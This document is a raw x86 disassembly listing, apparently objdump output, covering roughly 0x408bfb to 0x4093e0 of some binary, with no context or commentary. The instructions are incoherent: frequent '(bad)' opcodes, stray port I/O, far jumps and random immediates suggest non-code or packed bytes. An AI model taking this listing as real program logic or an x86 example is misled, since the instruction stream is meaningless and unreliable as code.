  408bfb:	lea    eax,[edi+0x26da354a]
  408c01:	xchg   ebx,eax
  408c02:	mov    ?,WORD PTR [esi]
  408c04:	jl     0x408bc6
  408c06:	add    edx,DWORD PTR [ebx+edi*4]
  408c09:	mov    esp,0xcb047134
  408c0e:	mov    edx,0xea9bb332
  408c13:	fs mov cl,cl
  408c16:	xlat   BYTE PTR ds:[ebx]
  408c17:	addr16 hlt 
  408c19:	popf   
  408c1a:	dec    ebx
  408c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c1c:	fdiv   DWORD PTR [ecx+edx*2+0x1dd02f9a]
  408c23:	jl     0x408bfa
  408c25:	mov    ebx,0x2205beb0
  408c2a:	pop    ecx
  408c2b:	sysenter 
  408c2d:	adc    ch,BYTE PTR ds:0x5af200b7
  408c33:	aas    
  408c34:	lock mov cl,0x5f
  408c37:	sub    DWORD PTR [ebx],esp
  408c39:	cdq    
  408c3a:	dec    ebx
  408c3b:	xor    BYTE PTR [esi+0x49],cl
  408c3e:	inc    esi
  408c3f:	dec    eax
  408c40:	ins    DWORD PTR es:[edi],dx
  408c41:	addr16 inc esi
  408c43:	es mov dl,0x1a
  408c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c47:	xchg   esi,eax
  408c48:	in     al,0xb3
  408c4a:	iret   
  408c4b:	jle    0x408c35
  408c4d:	dec    eax
  408c4e:	jle    0x408c63
  408c50:	adc    edi,DWORD PTR [esi]
  408c52:	xor    al,0xe1
  408c54:	rcr    ch,1
  408c56:	and    DWORD PTR [bp+di-0x66],edi
  408c5b:	lods   al,BYTE PTR ds:[esi]
  408c5c:	ins    BYTE PTR es:[edi],dx
  408c5d:	retf   
  408c5e:	jne    0x408cdf
  408c60:	cmp    edx,DWORD PTR [eax]
  408c62:	and    ecx,DWORD PTR ds:0x43206661
  408c68:	loope  0x408cbe
  408c6a:	add    DWORD PTR [edx-0x1],esi
  408c6d:	push   0x48559fa2
  408c72:	les    esi,FWORD PTR [edi]
  408c74:	out    0x17,al
  408c76:	pop    esi
  408c77:	mov    bh,0x61
  408c79:	cs cmc 
  408c7b:	shl    BYTE PTR [ebp+0x2ee5b5cd],cl
  408c81:	mov    al,ds:0x2327151f
  408c86:	add    edi,ebp
  408c88:	fidiv  WORD PTR ds:0xf60f5869
  408c8e:	cmp    DWORD PTR [eax],ebp
  408c90:	add    eax,0x856dd55a
  408c95:	jmp    0x7c8c:0x7b231450
  408c9c:	jl     0x408d1d
  408c9e:	mov    ch,0x1c
  408ca0:	pop    ebx
  408ca1:	test   DWORD PTR [edi],edx
  408ca3:	(bad)  
  408ca4:	out    0xf,eax
  408ca6:	add    dl,BYTE PTR [edi]
  408ca8:	pop    eax
  408ca9:	stc    
  408caa:	mov    ecx,0x5a9897ac
  408caf:	mov    ebp,0x1a1be61f
  408cb4:	(bad)  
  408cb5:	sbb    al,0xe2
  408cb7:	stos   DWORD PTR es:[edi],eax
  408cb8:	imul   ebp,DWORD PTR [eax-0x22],0xbf6d984e
  408cbf:	call   0xb8bb:0x6fac0282
  408cc6:	mov    WORD PTR [edx+0x49],ss
  408cc9:	aaa    
  408cca:	add    ebx,DWORD PTR [edi+0x4d5732e8]
  408cd0:	xchg   DWORD PTR [edx-0x4cec07d8],edx
  408cd6:	or     cl,BYTE PTR [eax]
  408cd8:	push   eax
  408cd9:	xor    eax,DWORD PTR [ebp-0x2cca460b]
  408cdf:	out    0xdb,eax
  408ce1:	add    al,0xfb
  408ce3:	mov    ch,0x6c
  408ce5:	sub    bl,ah
  408ce7:	scas   eax,DWORD PTR es:[edi]
  408ce8:	pusha  
  408ce9:	enter  0x728d,0xdc
  408ced:	popf   
  408cee:	push   ecx
  408cef:	pop    edi
  408cf0:	popf   
  408cf1:	push   ebp
  408cf2:	nop
  408cf3:	shl    DWORD PTR [ebp-0x5d7baf93],cl
  408cf9:	push   ds
  408cfa:	mov    bl,0x8c
  408cfc:	in     eax,0x64
  408cfe:	xchg   edi,eax
  408cff:	(bad)  
  408d01:	lods   eax,DWORD PTR ds:[esi]
  408d02:	cmp    edi,eax
  408d04:	mov    esp,0x7beb9145
  408d09:	in     eax,0x26
  408d0b:	fild   WORD PTR [eax+0x6a1a45f9]
  408d11:	jle    0x408d06
  408d13:	out    0x20,eax
  408d15:	xor    eax,0xbbc64101
  408d1a:	data16 das 
  408d1c:	iret   
  408d1d:	out    dx,al
  408d1e:	sub    cl,0x5
  408d21:	test   DWORD PTR [ebx+0x41],esi
  408d24:	addr16 out dx,eax
  408d26:	fwait
  408d27:	xor    eax,0xfa4b9650
  408d2c:	inc    esi
  408d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d2e:	lea    esi,[esi]
  408d30:	dec    eax
  408d31:	xchg   esp,esi
  408d33:	nop
  408d34:	xchg   ebp,eax
  408d35:	pop    ecx
  408d36:	jno    0x408dae
  408d38:	jae    0x408d68
  408d3a:	in     eax,0x45
  408d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d3d:	xchg   DWORD PTR [edi],eax
  408d3f:	pop    edi
  408d40:	stos   BYTE PTR es:[edi],al
  408d41:	jge    0x408dab
  408d43:	sar    BYTE PTR [edx],cl
  408d45:	pop    esi
  408d46:	fst    st(5)
  408d48:	and    eax,0x94bb16aa
  408d4d:	lahf   
  408d4e:	bound  edi,QWORD PTR [ecx+0x1a]
  408d51:	test   eax,0x8143c85d
  408d56:	mov    ebp,0xe5195e23
  408d5b:	adc    DWORD PTR [ebx+0x4f],ecx
  408d5e:	imul   esp,DWORD PTR [ecx-0x4b3b0d4c],0x6c
  408d65:	shl    BYTE PTR [edi+eiz*4-0x7b],cl
  408d69:	push   edx
  408d6a:	es push edx
  408d6c:	ins    BYTE PTR es:[edi],dx
  408d6d:	xor    DWORD PTR [edi+0x7993d46],ebx
  408d73:	pop    esp
  408d74:	ret    0x9d05
  408d77:	xchg   esi,eax
  408d78:	push   es
  408d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d7a:	mov    edi,0x790aec28
  408d7f:	dec    ebp
  408d80:	inc    esp
  408d81:	push   esi
  408d82:	cmp    DWORD PTR [edi],0x4f53520a
  408d88:	out    0xc1,al
  408d8a:	push   esi
  408d8b:	mov    al,ds:0x83cef08a
  408d90:	mov    ds:0x5c6c8a98,al
  408d95:	loop   0x408d2d
  408d97:	sbb    al,0xd
  408d99:	mov    ah,0x23
  408d9b:	test   DWORD PTR [ebx+edx*8-0x6e],0x7f4a788c
  408da3:	(bad)  
  408da5:	repz dec eax
  408da7:	and    BYTE PTR [ebp-0x20119929],dl
  408dad:	arpl   WORD PTR [edi+0x5fa70d51],cx
  408db3:	jmp    0x2f9d:0xd0ca9c23
  408dba:	sub    BYTE PTR [esi],dl
  408dbc:	fwait
  408dbd:	mov    ch,0x55
  408dbf:	xchg   esi,eax
  408dc0:	sti    
  408dc1:	sub    esi,esi
  408dc3:	in     eax,dx
  408dc4:	xor    esi,DWORD PTR [ebx+0x10e0b5a7]
  408dca:	jae    0x408e03
  408dcc:	es cmp al,0x84
  408dcf:	xchg   ebx,eax
  408dd0:	xchg   edi,eax
  408dd1:	jge    0x408df3
  408dd3:	mov    WORD PTR [edx],es
  408dd5:	daa    
  408dd6:	ret    
  408dd7:	mov    ds,ebx
  408dd9:	mov    esi,0xfd8c14a8
  408dde:	sub    eax,0x6a9d977d
  408de3:	xchg   BYTE PTR [edx+0x25d44123],ah
  408de9:	sbb    dl,dl
  408deb:	sbb    DWORD PTR [esi],ebp
  408ded:	inc    esp
  408dee:	stc    
  408def:	adc    DWORD PTR [ebp-0x51],ecx
  408df2:	xor    esi,DWORD PTR [esi-0x7c5c1ae2]
  408df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408df9:	sbb    bh,bl
  408dfb:	sub    eax,0xda0f4629
  408e00:	lods   al,BYTE PTR ds:[esi]
  408e01:	and    eax,0x3967854f
  408e06:	bnd jle 0x408db6
  408e09:	sub    eax,0xf0940ead
  408e0e:	jne    0x408da2
  408e10:	push   0xffffff8e
  408e12:	mov    WORD PTR [esi+0x29d6d6dd],ss
  408e18:	sbb    esp,DWORD PTR [edx+0x6aa6e983]
  408e1e:	daa    
  408e1f:	scas   eax,DWORD PTR es:[edi]
  408e20:	mov    ah,0xb
  408e22:	call   0x2332795b
  408e27:	out    dx,al
  408e28:	add    DWORD PTR [edx],esi
  408e2a:	std    
  408e2b:	jle    0x408de9
  408e2d:	stc    
  408e2e:	(bad)  
  408e2f:	or     DWORD PTR [eax],ecx
  408e31:	push   edi
  408e32:	or     BYTE PTR [esi+0x59],bl
  408e35:	mov    ds:0x5346448b,al
  408e3a:	inc    esi
  408e3b:	call   0x8889:0x4e820ad4
  408e42:	adc    cl,dl
  408e44:	ja     0x408ea5
  408e46:	adc    eax,0x9f3d1f59
  408e4b:	addr16 (bad) 
  408e4e:	jge    0x408dd6
  408e50:	fs out 0x24,al
  408e53:	dec    edx
  408e54:	inc    esp
  408e55:	xor    ebp,DWORD PTR [edx+0x49]
  408e58:	push   ss
  408e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e5a:	(bad)  
  408e5b:	maxps  xmm2,XMMWORD PTR [ebx+0x26]
  408e5f:	mov    WORD PTR [eax+0x660c58b1],?
  408e65:	add    BYTE PTR [ebp-0x74d5ba98],cl
  408e6b:	mov    esp,0xcf85d39c
  408e70:	adc    al,0x45
  408e72:	jge    0x408df8
  408e74:	popa   
  408e75:	mov    dh,0xbe
  408e77:	mov    ss,WORD PTR [ebp+0x7a0ba042]
  408e7d:	mov    bl,0xe8
  408e7f:	pop    edx
  408e80:	jmp    0xcb3:0xe91b2d50
  408e87:	push   ebp
  408e88:	sub    ebx,DWORD PTR [ebx+ebp*1-0x14]
  408e8c:	sbb    cl,al
  408e8e:	lods   al,BYTE PTR ds:[esi]
  408e8f:	inc    esp
  408e90:	outs   dx,BYTE PTR ds:[esi]
  408e91:	imul   edx
  408e93:	call   0xbf06f779
  408e98:	not    BYTE PTR [eax-0x1e80608c]
  408e9e:	sbb    dh,BYTE PTR [edi-0x6e973ca2]
  408ea4:	add    eax,0x6ddc1fb6
  408ea9:	data16 sbb cl,BYTE PTR [edi]
  408eac:	jmp    0x4084:0xba59030
  408eb3:	jns    0x408f0f
  408eb5:	xchg   ebx,eax
  408eb6:	push   es
  408eb7:	jne    0x408ef3
  408eb9:	mov    esi,0x72c9f2ae
  408ebe:	pop    edi
  408ebf:	add    al,0x96
  408ec1:	jle    0x408eaf
  408ec3:	mov    edi,0x6b3f2e6e
  408ec8:	pop    edi
  408ec9:	or     ch,0x21
  408ecc:	and    bh,BYTE PTR [ecx]
  408ece:	adc    ah,al
  408ed0:	out    0x11,al
  408ed2:	mov    esi,0x75beefbf
  408ed7:	jecxz  0x408e9f
  408ed9:	lds    edx,FWORD PTR [edx-0x5c]
  408edc:	outs   dx,BYTE PTR ds:[esi]
  408edd:	leave  
  408ede:	inc    ebx
  408edf:	or     BYTE PTR [ebx],ah
  408ee1:	push   edi
  408ee2:	mov    bh,0xf3
  408ee4:	fs hlt 
  408ee6:	adc    al,0xb7
  408ee8:	sar    DWORD PTR [esi+0x6c370aac],0xc3
  408eef:	popa   
  408ef0:	mov    ecx,0x49af1e02
  408ef5:	sub    dh,bl
  408ef7:	mov    ecx,0xca7d9742
  408efc:	mov    bl,0x45
  408efe:	push   ds
  408eff:	dec    edi
  408f00:	or     DWORD PTR [edx+0x75c7d559],edx
  408f06:	mov    al,ds:0x1cfa433d
  408f0b:	cmc    
  408f0c:	xchg   esi,eax
  408f0d:	xor    DWORD PTR [edi],0xd8ff2686
  408f13:	or     ebp,0x2b
  408f16:	es add eax,ebp
  408f19:	sahf   
  408f1a:	pop    ebp
  408f1b:	ins    BYTE PTR es:[edi],dx
  408f1c:	in     al,dx
  408f1d:	clc    
  408f1e:	lea    edx,[eax-0x78]
  408f21:	add    al,BYTE PTR [ebp-0x33]
  408f24:	or     eax,0xc2983a5e
  408f29:	fs xchg ecx,eax
  408f2b:	inc    esi
  408f2c:	push   0xffffff9d
  408f2e:	mov    esi,0x7814e1d0
  408f33:	push   eax
  408f34:	test   BYTE PTR [esi+0x47cea05c],bh
  408f3a:	in     eax,0x71
  408f3c:	out    0x54,eax
  408f3e:	xchg   ecx,eax
  408f3f:	inc    edi
  408f40:	sahf   
  408f41:	and    ecx,DWORD PTR [ecx+0x25]
  408f44:	test   esp,edi
  408f46:	mov    bl,0xc7
  408f48:	outs   dx,DWORD PTR ds:[esi]
  408f49:	push   edi
  408f4a:	mov    ebp,DWORD PTR [ebp-0x12]
  408f4d:	ss inc edi
  408f4f:	push   ecx
  408f50:	jnp    0x408fc7
  408f52:	loope  0x408efb
  408f54:	imul   BYTE PTR [ebp+0x7bd8fcc5]
  408f5a:	out    dx,al
  408f5b:	sbb    eax,0x2366f1ae
  408f60:	mov    ah,0x98
  408f62:	fst    QWORD PTR [esi+0x31]
  408f65:	cmp    ch,BYTE PTR [eax+0x65c852ca]
  408f6b:	addr16 or eax,0xd896a9be
  408f71:	xchg   ebp,eax
  408f72:	dec    esp
  408f73:	add    ecx,DWORD PTR [ecx+esi*1+0xe3dca80]
  408f7a:	(bad)  
  408f7b:	test   al,0xd9
  408f7d:	in     al,dx
  408f7e:	stos   DWORD PTR es:[edi],eax
  408f7f:	fst    DWORD PTR [ecx]
  408f81:	sbb    eax,0x558ef82e
  408f86:	lahf   
  408f87:	lea    esi,[edi+0x510ed3f4]
  408f8d:	push   ebp
  408f8e:	inc    ebp
  408f8f:	(bad)  
  408f91:	(bad)  
  408f92:	data16 mov dh,0xca
  408f95:	call   0x1948:0x7d1dcc4d
  408f9c:	pop    esp
  408f9d:	mov    ebp,0x9a38d8c2
  408fa2:	add    DWORD PTR [esi],edx
  408fa4:	leave  
  408fa5:	lods   al,BYTE PTR ds:[esi]
  408fa6:	frstor [eax+0x44]
  408fa9:	mov    bl,BYTE PTR [edx+0x55]
  408fac:	jge    0x408fa6
  408fae:	inc    ebp
  408faf:	adc    BYTE PTR [ecx+0x64],ah
  408fb2:	xchg   ecx,eax
  408fb3:	into   
  408fb4:	or     BYTE PTR [ecx],ah
  408fb6:	(bad)  
  408fb7:	stos   BYTE PTR es:[edi],al
  408fb8:	add    ebp,ecx
  408fba:	or     eax,edx
  408fbc:	(bad)  
  408fbd:	in     eax,dx
  408fbe:	jl     0x409019
  408fc0:	add    al,0x26
  408fc2:	imul   BYTE PTR [esi-0x7a]
  408fc5:	loop   0x409018
  408fc7:	mov    edi,0x72169fef
  408fcc:	dec    edi
  408fcd:	inc    esi
  408fce:	mov    ebx,0xef57406e
  408fd3:	or     DWORD PTR [ebx-0x49],ecx
  408fd6:	(bad)  [ecx+edx*2]
  408fd9:	mov    ebx,0xf346ef4a
  408fde:	xor    edx,DWORD PTR gs:[di+0x46aa]
  408fe4:	push   ss
  408fe5:	retf   
  408fe6:	retf   
  408fe7:	cld    
  408fe8:	pop    ebp
  408fe9:	push   cs
  408fea:	mov    ecx,0xa30f37c1
  408fef:	pop    esp
  408ff0:	enter  0xf29a,0xdc
  408ff4:	addr16 adc ecx,0x20f381d9
  408ffb:	jne    0x408fbe
  408ffd:	inc    ecx
  408ffe:	inc    edi
  408fff:	arpl   WORD PTR [eax+0x5c797fb8],bp
  409005:	push   edi
  409006:	cs pop edi
  409008:	cmp    dh,dl
  40900a:	addr16 ja 0x40906e
  40900d:	or     al,0x3d
  40900f:	xchg   ebx,eax
  409010:	gs jno 0x408ffb
  409013:	jno    0x408fce
  409015:	daa    
  409016:	xchg   ebx,eax
  409017:	test   BYTE PTR [ecx+0x1],ah
  40901a:	mov    al,0x8a
  40901c:	sbb    ebp,DWORD PTR [ebx+0x5b4375c1]
  409022:	xor    edi,DWORD PTR [eax-0x25bfb56c]
  409028:	xchg   dl,dh
  40902a:	mov    ebx,0x232034ce
  40902f:	scas   eax,DWORD PTR es:[edi]
  409030:	je     0x409056
  409032:	out    0xd8,eax
  409034:	rcl    DWORD PTR [edx-0x248e4159],cl
  40903a:	inc    eax
  40903b:	xchg   edx,eax
  40903c:	sahf   
  40903d:	xor    esp,DWORD PTR [edi]
  40903f:	xlat   BYTE PTR ds:[ebx]
  409040:	sbb    DWORD PTR [esi+eax*8-0x53],esi
  409044:	call   0x8d7eb316
  409049:	(bad)  
  40904b:	push   0x21b9df9
  409050:	fst    QWORD PTR [ecx+0x6f39b0a6]
  409056:	stc    
  409057:	(bad)  
  409059:	mov    ebx,0x7823a57e
  40905e:	(bad)  
  40905f:	jb     0x4090d6
  409061:	cli    
  409062:	stc    
  409063:	stc    
  409064:	mov    edx,0xaf4d7f65
  409069:	aad    0x76
  40906b:	sbb    al,0x26
  40906d:	pop    ecx
  40906e:	fstp   TBYTE PTR [esi-0x1b7aefc0]
  409074:	jecxz  0x40906b
  409076:	and    DWORD PTR [edi+ebp*8],esp
  409079:	lods   eax,DWORD PTR ds:[esi]
  40907a:	mov    bl,0xf9
  40907c:	jl     0x409055
  40907e:	mov    DWORD PTR [eax+0x42645e5a],ecx
  409084:	add    BYTE PTR [ecx],0x49
  409087:	mov    eax,ds:0x1a7433c2
  40908c:	cwde   
  40908d:	push   es
  40908e:	adc    DWORD PTR ss:[esi-0x59],eax
  409092:	pop    es
  409093:	push   cs
  409094:	push   ecx
  409095:	push   eax
  409096:	and    DWORD PTR [ebp+0x7aca6e68],edx
  40909c:	repz jg 0x4090dc
  40909f:	(bad)  
  4090a0:	popf   
  4090a1:	test   dh,0x96
  4090a4:	push   ds
  4090a5:	or     ecx,DWORD PTR [edx-0x39]
  4090a8:	inc    edi
  4090a9:	repz add al,0x6a
  4090ac:	xor    cl,dh
  4090ae:	push   ds
  4090af:	fld    st(5)
  4090b1:	sbb    edx,edx
  4090b3:	mov    WORD PTR [ebx-0x5fd7dee2],cs
  4090b9:	dec    esi
  4090ba:	add    ebp,DWORD PTR [edx]
  4090bc:	mov    al,ds:0x20899d2e
  4090c1:	jg     0x40904f
  4090c3:	rol    bh,0x11
  4090c6:	or     eax,0x6cf99b60
  4090cb:	aam    0x99
  4090cd:	ret    
  4090ce:	add    eax,0xb48f6bfa
  4090d3:	in     al,0x92
  4090d5:	shl    BYTE PTR ds:0x40b8bbd5,cl
  4090db:	ins    BYTE PTR es:[edi],dx
  4090dc:	popf   
  4090dd:	or     DWORD PTR [esi],ecx
  4090df:	int    0x33
  4090e1:	sub    edx,DWORD PTR [esi]
  4090e3:	add    al,0x43
  4090e5:	loop   0x409092
  4090e7:	repz cli 
  4090e9:	int    0x2a
  4090eb:	arpl   bx,bx
  4090ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ee:	jnp    0x409082
  4090f0:	(bad)  
  4090f1:	sbb    eax,0x40fb4429
  4090f6:	push   ds
  4090f7:	out    0x1f,al
  4090f9:	shr    DWORD PTR ds:0x1599437f,cl
  4090ff:	inc    ebx
  409100:	cmp    eax,0x8cec910e
  409105:	iret   
  409106:	sbb    al,0x82
  409108:	retf   
  409109:	inc    esp
  40910a:	inc    esi
  40910b:	or     eax,ebx
  40910d:	sub    BYTE PTR [ebx+0x72f562f8],dh
  409113:	and    BYTE PTR [ebp+0x67523bf7],bl
  409119:	push   ss
  40911a:	fld    TBYTE PTR [edi+0x20]
  40911d:	adc    eax,0xd34da81
  409122:	stos   DWORD PTR es:[edi],eax
  409123:	xchg   edx,eax
  409124:	(bad)  
  409125:	sub    WORD PTR [esp+ebx*8],bx
  409129:	push   esi
  40912a:	ins    DWORD PTR es:[edi],dx
  40912b:	call   0xa32a:0xfba91ca5
  409132:	retf   
  409133:	mov    ecx,0x41d226a0
  409138:	cmp    BYTE PTR [ecx+edx*2],al
  40913b:	mov    al,ds:0xae9f68d4
  409140:	mov    edx,0xb742dcf
  409145:	lea    edi,[ecx]
  409147:	lock and BYTE PTR [ebx+0x25],cl
  40914b:	ret    
  40914c:	(bad)  
  40914d:	retf   
  40914e:	out    0x73,eax
  409150:	inc    esi
  409151:	push   esi
  409152:	mov    ebp,0xb1654e57
  409157:	jle    0x4090fc
  409159:	pusha  
  40915a:	jae    0x4090e5
  40915c:	mov    bl,cl
  40915e:	mov    ds:0x76eac411,eax
  409163:	mov    ch,0x2
  409165:	mov    ss,edi
  409167:	xlat   BYTE PTR ds:[ebx]
  409168:	inc    esi
  409169:	pop    ebp
  40916a:	sbb    DWORD PTR [ecx-0x753d295a],0xbe92e954
  409174:	sbb    al,BYTE PTR [ebp-0x6ca007ea]
  40917a:	pop    ebp
  40917b:	push   esi
  40917c:	aam    0x7c
  40917e:	adc    ebp,DWORD PTR [edx+0x58]
  409181:	mov    DWORD PTR [ecx+0x53],ebp
  409184:	ja     0x409199
  409186:	mov    ah,0x44
  409188:	mov    ah,0x76
  40918a:	adc    esi,DWORD PTR [eax]
  40918c:	int    0x2d
  40918e:	jne    0x40916d
  409190:	fldenv [esi-0x71]
  409193:	lea    eax,[eax+0x6319443c]
  409199:	xchg   ebp,eax
  40919a:	or     ebp,ebx
  40919c:	jb     0x409183
  40919e:	or     al,0x6a
  4091a0:	xchg   BYTE PTR [ebx+0x51a97eb],ch
  4091a6:	or     eax,0x27ea6741
  4091ab:	jmp    DWORD PTR [ecx-0x7fd05c2e]
  4091b1:	ds mov ecx,0xb0a49f3f
  4091b7:	xchg   ebx,eax
  4091b8:	imul   eax,DWORD PTR [edi-0x72],0xfffffff6
  4091bc:	add    DWORD PTR [edx],esp
  4091be:	push   edx
  4091bf:	daa    
  4091c0:	call   0xe9aa:0x87bef511
  4091c7:	sbb    DWORD PTR [eax+0x6b],eax
  4091ca:	test   eax,0xf0f8ce21
  4091cf:	lahf   
  4091d0:	sar    edi,0xfe
  4091d3:	(bad)  
  4091d4:	and    BYTE PTR [eax],dl
  4091d6:	xchg   esp,eax
  4091d7:	scas   al,BYTE PTR es:[edi]
  4091d8:	cmp    eax,0x691b120b
  4091dd:	pop    esi
  4091de:	pop    edx
  4091df:	cmp    cl,BYTE PTR [edx+0x1abd4765]
  4091e5:	iret   
  4091e6:	test   esp,0xcc4ffbad
  4091ec:	mov    eax,ds:0x2271fcd8
  4091f1:	or     cl,BYTE PTR [esi-0x7a]
  4091f4:	jp     0x409229
  4091f6:	loope  0x409219
  4091f8:	jns    0x4091b9
  4091fa:	or     eax,0x90f60f96
  4091ff:	inc    ebx
  409200:	data16 xor al,0x8e
  409203:	pop    ds
  409204:	stc    
  409205:	jnp    0x4091b0
  409207:	dec    esp
  409208:	adc    eax,0xbb1b90b8
  40920d:	and    eax,0xe1dbe812
  409212:	dec    edx
  409213:	mov    edi,0xa062604d
  409218:	cmc    
  409219:	rcl    DWORD PTR [eax],cl
  40921b:	mov    DWORD PTR es:[ebp-0x67],0x76434c10
  409223:	push   0x44
  409225:	jmp    0x6ec5:0xb4ce81be
  40922c:	xor    BYTE PTR [eax+0x53],ch
  40922f:	in     eax,0xfb
  409231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409232:	and    al,BYTE PTR [eax+edi*1-0x3d4147ab]
  409239:	ror    ebp,cl
  40923b:	mov    DWORD PTR [edi],esi
  40923d:	ins    BYTE PTR es:[edi],dx
  40923e:	nop
  40923f:	xchg   ebx,eax
  409240:	into   
  409241:	iret   
  409242:	adc    al,0xb8
  409244:	int3   
  409245:	ror    BYTE PTR [ecx+0x36],0xca
  409249:	jmp    0x9f736775
  40924e:	ins    DWORD PTR es:[edi],dx
  40924f:	daa    
  409250:	sub    eax,0x4996b496
  409255:	xor    eax,0x26a6b3d8
  40925a:	retf   0x5853
  40925d:	push   cs
  40925e:	test   BYTE PTR [ebx+edi*2+0x347d6da1],0x72
  409266:	cmp    edi,ecx
  409268:	cwde   
  409269:	pop    ebx
  40926a:	add    BYTE PTR [esi+0x56],0x4e
  40926e:	jne    0x4091f6
  409270:	stc    
  409271:	pop    ds
  409272:	xchg   esi,eax
  409273:	ins    BYTE PTR es:[edi],dx
  409274:	xor    BYTE PTR [ebx+0x5d],cl
  409277:	in     eax,dx
  409278:	scas   al,BYTE PTR es:[edi]
  409279:	imul   esi,DWORD PTR [ebx+0x1f],0x77
  40927d:	inc    ecx
  40927e:	ret    0xde5
  409281:	aas    
  409282:	sti    
  409283:	add    DWORD PTR [edx],esp
  409285:	pop    esp
  409286:	dec    edx
  409287:	(bad)  [edi+0x39e597e2]
  40928d:	push   edi
  40928e:	sbb    eax,0x24cd7f04
  409293:	and    al,cl
  409295:	sti    
  409296:	(bad)  
  409297:	adc    al,0x1f
  409299:	pusha  
  40929a:	push   0x77
  40929c:	(bad)
  40929f:	js     0x409272
  4092a1:	dec    ebx
  4092a2:	adc    dh,al
  4092a4:	out    0x0,al
  4092a6:	mov    edi,0xca63f97c
  4092ab:	xchg   edx,eax
  4092ac:	sub    BYTE PTR [ebx+ebx*8],bl
  4092af:	arpl   si,di
  4092b1:	xchg   ebx,eax
  4092b2:	pushf  
  4092b3:	or     al,0x9f
  4092b5:	add    DWORD PTR ds:0xc95c692d,esp
  4092bb:	shl    ch,0xa4
  4092be:	jb     0x4092f8
  4092c0:	inc    ecx
  4092c1:	sub    BYTE PTR [ecx+0x4beeed96],al
  4092c7:	mov    ebp,0x1ed71c8f
  4092cc:	jne    0x4092b0
  4092ce:	call   0xc161148d
  4092d3:	mov    ?,WORD PTR [eax]
  4092d5:	(bad)  
  4092d6:	(bad)  
  4092d7:	div    BYTE PTR [edx]
  4092d9:	or     DWORD PTR [edx],ebx
  4092db:	push   edi
  4092dc:	mov    al,0x77
  4092de:	xor    eax,0x86970022
  4092e3:	inc    ebp
  4092e4:	add    DWORD PTR [edi+0x1e],esp
  4092e7:	les    ebx,FWORD PTR [ebx-0x18]
  4092ea:	pop    ecx
  4092eb:	pop    esi
  4092ec:	dec    ebx
  4092ed:	xor    eax,0x13e34265
  4092f2:	cmp    dl,bl
  4092f4:	dec    ebx
  4092f5:	sbb    bh,bh
  4092f7:	inc    esp
  4092f8:	mov    ecx,0xf8982ce2
  4092fd:	xchg   ebp,eax
  4092fe:	ret    0x396f
  409301:	aam    0x47
  409303:	push   edi
  409304:	sub    eax,0x8faccec9
  409309:	push   esi
  40930a:	out    0x82,al
  40930c:	mov    edx,edi
  40930e:	mov    ch,0x7
  409310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409311:	retf   0xc6c7
  409314:	jb     0x409340
  409316:	add    al,0x6c
  409318:	adc    DWORD PTR [eax],ebp
  40931a:	ja     0x40936d
  40931c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40931d:	data16 add BYTE PTR [esi],dh
  409320:	add    DWORD PTR [eax+ecx*1+0x56],0x27b75273
  409328:	xor    BYTE PTR [ecx],al
  40932a:	mov    cl,0xd
  40932c:	xchg   BYTE PTR [ecx],dl
  40932e:	jb     0x4093a0
  409330:	sbb    cl,BYTE PTR [esp+ecx*2]
  409333:	mov    esp,0xbdcc2cbd
  409338:	jmp    0x216a:0x2fd73405
  40933f:	cmp    edi,esi
  409341:	fsubr  DWORD PTR [esi]
  409343:	addr16 dec esi
  409345:	lahf   
  409346:	cmp    BYTE PTR [ebx-0x2],ah
  409349:	sbb    edx,edi
  40934b:	xor    BYTE PTR [ecx-0x18],bh
  40934e:	mov    al,BYTE PTR [ebx+0x6b0942fc]
  409354:	stos   DWORD PTR es:[edi],eax
  409355:	pop    DWORD PTR [esi]
  409357:	xchg   edx,eax
  409358:	push   0xffffff80
  40935a:	pop    ss
  40935b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40935c:	dec    ebx
  40935d:	ror    cl,0x38
  409360:	push   0x28ebd2c5
  409365:	adc    eax,0xaede88ca
  40936a:	sub    ebp,DWORD PTR [ecx]
  40936c:	or     dl,0xad
  40936f:	pop    ds
  409370:	jl     0x40930a
  409372:	push   0xb766806b
  409377:	or     DWORD PTR [eax],esi
  409379:	push   edx
  40937a:	lock dec esi
  40937c:	xor    al,0x8e
  40937e:	mov    al,0x79
  409380:	les    ebp,FWORD PTR [ebp+ecx*1+0x2d5bdd3c]
  409387:	popf   
  409388:	ret    0xa35
  40938b:	xor    BYTE PTR [eax],dh
  40938d:	hlt    
  40938e:	inc    ecx
  40938f:	dec    ebx
  409390:	test   al,0x3c
  409392:	add    al,0xe7
  409394:	cld    
  409395:	lods   al,BYTE PTR ds:[esi]
  409396:	mov    ds:0xfc1dbd7f,eax
  40939b:	inc    edx
  40939c:	pop    ds
  40939d:	xchg   BYTE PTR [ecx-0x10],ch
  4093a0:	xchg   edi,eax
  4093a1:	adc    bl,BYTE PTR [ebx-0x72]
  4093a4:	iret   
  4093a5:	bound  edi,QWORD PTR [ebp-0x790629a]
  4093ab:	push   ebp
  4093ac:	bound  esp,QWORD PTR [ebx]
  4093ae:	add    DWORD PTR [ebx+0x6a],esp
  4093b1:	xor    bh,BYTE PTR [ebp+0x46]
  4093b4:	loop   0x409431
  4093b6:	cdq    
  4093b7:	mov    edi,0x8ec95280
  4093bc:	pop    esi
  4093bd:	mov    esp,0x9abaf683
  4093c2:	adc    DWORD PTR [ebx],ecx
  4093c4:	mov    bh,0xda
  4093c6:	imul   esp,DWORD PTR [edi-0x1c1b8e07],0xffffffac
  4093cd:	ss ins DWORD PTR es:[edi],dx
  4093cf:	fucomip st,st(4)
  4093d1:	pop    esp
  4093d2:	pop    ds
  4093d3:	jno    0x409409
  4093d5:	fadd   DWORD PTR [edx+eiz*1]
  4093d8:	int    0x73
  4093da:	xchg   esp,eax
  4093db:	sub    ah,al
  4093dd:	dec    edi
  4093de:	mov    ch,0xb6
  4093e0:	ror    DWORD PTR [ebx],0xff
